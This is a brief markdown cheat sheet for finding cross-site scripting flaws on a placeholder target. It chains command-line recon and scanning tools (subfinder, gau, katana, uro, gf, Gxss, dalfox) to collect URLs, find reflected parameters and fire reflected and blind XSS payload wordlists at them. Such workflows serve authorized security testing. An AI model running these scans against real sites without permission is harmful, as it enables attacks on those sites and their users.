# XSS Automation

get subdomains for example subfinder/projectdiscovery put in file e.g. subs.txt

## GetAllUrls
```
echo "TARGET.com" | gau --threads 5 >> endp.txt
```
CRAWL
```
cat subs.txt | katana -jc >> endp.txt
```


## Duplicate remover
```
cat endp.txt | uro >> endp_F.txt
```


## PARAMETERS
```
cat endp_F.txt | gf xss >> XSS.txt
```


## REFLECTED PARAMS
```
cat XSS.txt | Gxss -p khXSS -o XSS_ref.txt
```


## AUTOMATION SCANN FOR XSS

```
dalfox file XSS_ref.txt -o Vul_XSS.txt
```


## Simple URL
```
 dalfox url https://TARGET.com/?affiliateID=88573&affiliateNetwork=ho&transaction_id=khXSS --custom-payload /usr/share/wordlists/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
```


## Blind Xss with clear results
```
 dalfox file XSS_ref.txt -o Vul_XSS.txt --custom-payload Attacks/XXS/blind-xss-payloads.txt
```

 
## Blind url
```
dalfox url "https://TARGET.com/?q=khXSS&utm_content=sst_gc_gc_btn&utm_medium=cpc&utm_source=placement&utm_term=smallseotools" --custom-payload Attacks/XXS/blind-xss-payloads.txt 
```